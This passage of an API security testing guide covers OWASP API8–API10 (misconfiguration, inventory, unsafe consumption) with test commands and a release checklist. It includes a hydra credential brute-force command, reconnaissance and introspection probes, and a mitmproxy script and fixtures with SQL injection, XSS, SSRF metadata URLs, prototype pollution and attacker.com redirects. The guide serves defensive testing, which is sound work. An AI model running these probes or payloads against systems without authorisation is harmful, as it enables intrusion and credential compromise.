5. `nmap --script ssl-enum-ciphers -p 443 api.example.com`.

**Automated:**

- ZAP passive scan + active scan rule pack.
- Nikto, testssl.sh, sslyze.
- Custom curl battery for headers + CORS.

### Tools

- **ZAP**, **Burp**.
- **Nikto** — classic web server checks.
- **testssl.sh** — TLS configuration.
- **`securityheaders.com`** for quick header audits.
- **`trufflehog`/`gitleaks`** — secrets in code/repos.

### Example requests / payloads

CORS reflection check:

```bash
curl -i -H "Origin: https://evil.com" \
  https://api.example.com/v1/me
# Look for:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

Spring Boot Actuator probe:

```bash
for p in env mappings beans heapdump configprops trace loggers metrics; do
  curl -s -o /dev/null -w "$p %{http_code}\n" https://api.example.com/actuator/$p
done
```

Security headers check:

```bash
curl -sI https://api.example.com/v1/health | tee headers.txt
for h in Strict-Transport-Security Content-Security-Policy \
         X-Content-Type-Options X-Frame-Options Referrer-Policy \
         Permissions-Policy; do
  grep -i "^$h:" headers.txt || echo "MISSING: $h"
done
```

TLS audit:

```bash
testssl.sh --severity HIGH https://api.example.com
nmap --script ssl-enum-ciphers -p 443 api.example.com
```

Verbose error trigger:

```bash
curl https://api.example.com/v1/users/AAAAAAAAAA
# Look for: stack traces, framework versions, file paths, SQL fragments
```

Default-credential dictionary attack on admin panels (lab only):

```bash
hydra -L users.txt -P pass.txt api.example.com http-post-form \
  "/admin/login:username=^USER^&password=^PASS^:F=invalid"
```

### What "passing" looks like

- Errors return generic messages with a correlation ID; details go to logs only.
- TLS 1.2+ only, modern cipher suites; HSTS with `includeSubDomains`.
- Strict CORS with explicit origin allow-list and credentials only when needed.
- Security headers present and correct; `X-Powered-By`/`Server` minimized.
- Admin/management endpoints (Actuator, Kibana, etc.) bound to internal networks.
- Default credentials rotated and audited; secrets in a vault, not env files.
- Hardening is encoded in IaC and verified by a config scanner in CI.

### Mapping

- CWE-16: Configuration
- CWE-209: Information Exposure Through an Error Message
- CWE-942: Permissive Cross-domain Policy with Untrusted Domains
- Web Top 10 2021: A05 Security Misconfiguration

---

## API9:2023 — Improper Inventory Management

### Definition

You cannot defend what you do not know exists. APIs proliferate: old versions left running, debug endpoints in production, partner endpoints lacking the same controls, staging hosts indexed by search engines. Improper inventory means **the team does not have an accurate, current map** of the API surface, including:

- Versions in production (`/v1`, `/v2`, `/v3-beta`, `/internal`).
- Environments (prod, staging, dev) and their access controls.
- Deprecated endpoints still answering.
- Third-party data flows ("which APIs do we call, with what data?").

### Common attack vectors

1. **Old API versions** with weaker auth or known CVEs (`/v1` after `/v2` released).
2. **Staging endpoints** in DNS (`api-staging.`, `dev-api.`, `qa.`) exposed to internet.
3. **Swagger/OpenAPI** files publicly readable, listing endpoints not in the official docs.
4. **Beta/internal endpoints** (`/v2-beta`, `/internal`) routable from internet.
5. **Forgotten subdomains** (subdomain takeover).
6. **GraphQL introspection** enabled in production.
7. **Postman public workspaces** containing internal collections.

### How to test

**Manual:**

1. Enumerate subdomains: `crt.sh`, `subfinder`, `amass`.
2. Probe common docs paths: `/openapi.json`, `/openapi.yaml`, `/swagger.json`, `/swagger-ui.html`, `/api-docs`, `/v2/api-docs`, `/redoc`, `/graphql`, `/graphiql`, `/.well-known/openapi`.
3. Probe version variants for any endpoint: `/v1/`, `/v2/`, `/v3/`, `/internal/`, `/beta/`, `/legacy/`.
4. Compare endpoints listed in OpenAPI against endpoints actually reachable.
5. Search Postman public workspaces, GitHub, Pastebin for the company's API name.
6. Check `robots.txt`, `sitemap.xml`.

**Automated:**

- `kiterunner brute -A=apiroutes-240528 https://api.example.com`
- `gau` / `waybackurls` to pull historic endpoints.
- ZAP spider with OpenAPI import.

### Tools

- **subfinder**, **amass**, **assetfinder** — subdomain enumeration.
- **kiterunner** — API-aware content discovery.
- **ffuf** with API wordlists from SecLists.
- **`gau`**, **`waybackurls`**, **`getJS`** — historic endpoint mining.
- **`trufflehog`**, **GitHub code search** — secrets and endpoints in public repos.

### Example requests / payloads

OpenAPI/Swagger discovery sweep:

```bash
HOST=https://api.example.com
for p in \
  openapi.json openapi.yaml openapi.yml \
  swagger.json swagger.yaml swagger.yml \
  swagger-ui.html swagger-ui/ \
  api-docs api-docs.json v2/api-docs v3/api-docs \
  redoc docs/openapi.json \
  .well-known/openapi.json \
  graphql graphiql playground; do
  echo -n "$p -> "
  curl -s -o /dev/null -w "%{http_code}\n" $HOST/$p
done
```

GraphQL introspection probe:

```bash
curl -X POST https://api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'
```

Subdomain enumeration:

```bash
subfinder -d example.com -all -silent | tee subs.txt
amass enum -passive -d example.com >> subs.txt
sort -u subs.txt | httpx -title -tech-detect -status-code
```

Old version probing:

```bash
TOKEN_USER="..."  # token from current /v3
for v in v1 v2 v3 v4 v2-beta v3-beta internal legacy; do
  curl -s -o /dev/null -w "/$v/users/me %{http_code}\n" \
    -H "Authorization: Bearer $TOKEN_USER" \
    "https://api.example.com/$v/users/me"
done
```

Kiterunner content discovery (route-aware):

```bash
kr scan https://api.example.com \
  -A=apiroutes-240528 \
  -H "Authorization: Bearer $TOKEN" \
  -o results.txt
```

OpenAPI-driven ZAP scan:

```bash
docker run -t owasp/zap2docker-stable zap-api-scan.py \
  -t https://api.example.com/openapi.json \
  -f openapi \
  -r zap-report.html
```

### What "passing" looks like

- A canonical inventory exists (often an internal API catalog) with: name, owner, version, environments, auth, data classification.
- Deprecated versions return `410 Gone` with a sunset header; staging is **not** routable from the public internet.
- OpenAPI specs are generated from code, kept in sync, and **only published to authorized audiences**.
- GraphQL introspection disabled in production.
- Subdomain monitoring catches new public hostnames.
- A "kill old versions" cadence is owned by a team.

### Mapping

- CWE-1059: Insufficient Technical Documentation
- CWE-1053: Missing Documentation for Design
- CWE-200 (when old versions leak data)
- Web Top 10 2021: A05 Security Misconfiguration, A09 Security Logging and Monitoring Failures

---

## API10:2023 — Unsafe Consumption of APIs

### Definition

Your API calls **other** APIs (third parties, partners, internal microservices) and trusts their responses too much. Trust ranges from "no input validation on the response" to "follow redirects to anywhere" to "execute logic conditional on data we did not author". When an upstream is compromised or malicious, that trust becomes the breach path.

### Common attack vectors

1. **No validation of upstream JSON** — an upstream returns a field that triggers SQL injection in your downstream query.
2. **Following redirects from third-party** to attacker hosts.
3. **Mass-deserializing upstream responses** into objects with side effects.
4. **TLS verification disabled** for outbound calls (`verify=False`, `InsecureSkipVerify`).
5. **Trusting upstream identity claims** (e.g., a partner says `customer_email`, you don't re-verify).
6. **Importing upstream URLs** as resources without SSRF protection (chains to API7).
7. **Caching tainted upstream data** and serving it to all users.

### How to test

**Manual:**

1. Map every outbound API call (third-party SDKs, partner webhooks, internal gRPC).
2. For each, model "what if the upstream returns malicious payload X?": oversized, malformed, JSON with prototype pollution keys (`__proto__`), HTML/script in fields rendered server-side.
3. Stand up a **mock malicious upstream** (mitmproxy, WireMock) and intercept the call to inject hostile responses, then observe your service's behavior.
4. Verify TLS verification is on and certificates are pinned where appropriate.
5. Check redirect handling: respond with `302` to internal IPs.

**Automated:**

- Contract tests with hostile fixtures (oversize, malformed, injection).
- Chaos-style fault injection using `toxiproxy` or `mitmproxy` scripts.

### Tools

- **mitmproxy** — script malicious responses for an upstream.
- **WireMock**, **MockServer**, **Prism** — programmable upstream stubs.
- **toxiproxy** — fault injection.
- **httpx**, **gobetween** — TLS/cert checks on outbound traffic.

### Example requests / payloads

Mitmproxy script that taints a third-party response (Python):

```python
# evil_upstream.py — run with: mitmproxy -s evil_upstream.py
from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    if "partner.example.com" in flow.request.pretty_host:
        flow.response.set_text(
            '{"customer_email":"victim@example.com\' OR 1=1--",'
            '"avatar":"http://169.254.169.254/latest/meta-data/",'
            '"trusted_role":"admin",'
            '"__proto__":{"isAdmin":true},'
            '"redirect":"http://attacker.com/x"}'
        )
        flow.response.headers["content-type"] = "application/json"
```

Then point your service's outbound traffic through the proxy and watch what it does. Things to assert:

- Your service does not blindly insert `customer_email` into SQL or shell.
- It does not fetch `avatar` URL without SSRF guard (see API7).
- It does not honor `trusted_role` without independent authorization.
- It does not pollute `Object.prototype` in Node.
- It does not follow `redirect` past the configured upstream.

TLS verification check (Python service config audit example):

```bash
# search the codebase for footguns
rg -n "verify\s*=\s*False" --type py
rg -n "InsecureSkipVerify\s*:\s*true" --type go
rg -n "rejectUnauthorized\s*:\s*false" --type js
```

Hostile JSON test fixtures to feed into contract tests:

```json
{
  "id": "1' OR '1'='1",
  "name": "<script>alert(1)</script>",
  "amount": 1e308,
  "tags": ["a", null, {"$gt": ""}],
  "callback_url": "http://169.254.169.254/latest/meta-data/",
  "__proto__": {"polluted": true},
  "huge_field": "AAAA... 50MB ..."
}
```

### What "passing" looks like

- All outbound calls validate certificates against the system trust store; pinning where the relationship is sensitive.
- Upstream responses are parsed into **strict schemas** (JSON Schema, Zod, Pydantic with `extra="forbid"`).
- Untrusted fields from upstream never reach SQL, shell, template engines, or auth decisions without re-validation/escaping.
- Outbound URLs from upstream are treated like user input (allow-listed, SSRF-checked).
- Redirects from third parties are not followed automatically, or are followed only within an allow-list.
- Upstream outages and hostile payloads are part of chaos / fault-injection drills.

### Mapping

- CWE-20: Improper Input Validation
- CWE-915: Mass Assignment
- CWE-918: SSRF (when chained)
- CWE-345: Insufficient Verification of Data Authenticity
- Web Top 10 2021: A08 Software and Data Integrity Failures, A10 SSRF

---

## Putting it together — a QA checklist per release

Run this matrix before any externally-facing release. Each cell is a yes/no with a linked test artifact (Postman, Karate, ZAP scan job).

| Area | Question | Where to encode |
|------|----------|-----------------|
| BOLA | Two-user matrix per CRUD endpoint runs in CI | Postman/Newman or Karate |
| BOPLA | Mass-assignment fixture per write endpoint | Contract tests |
| BFLA | Role x endpoint matrix; new endpoint must have a row | Karate / pytest-parametrize |
| Authentication | jwt_tool test pack passes | CI job |
| Resource Consumption | Pagination + size + GraphQL depth limits asserted | Load tests + unit tests |
| Business Flows | Sensitive flows have CAPTCHA/rate tests | Synthetic monitor |
| SSRF | URL inputs allow-list tests + Collaborator OOB | ZAP/Burp scheduled scan |
| Misconfiguration | testssl.sh + headers checker green | Nightly scan |
| Inventory | OpenAPI matches reality; old versions return 410 | Diff job |
| Unsafe Consumption | Hostile upstream fixture replays clean | Contract tests |

If any single row is "no", that release is shipping with a known API Top 10 risk.

## Further reading

- OWASP API Security Project: <https://owasp.org/API-Security/>
- 2023 PDF: <https://owasp.org/API-Security/editions/2023/en/dist/owasp-api-security-top-10.pdf>
- Crashtest Security cheatsheet on API testing.
- PortSwigger Web Security Academy — API testing and access control labs.
- ProjectDiscovery `nuclei` templates for API-specific checks.
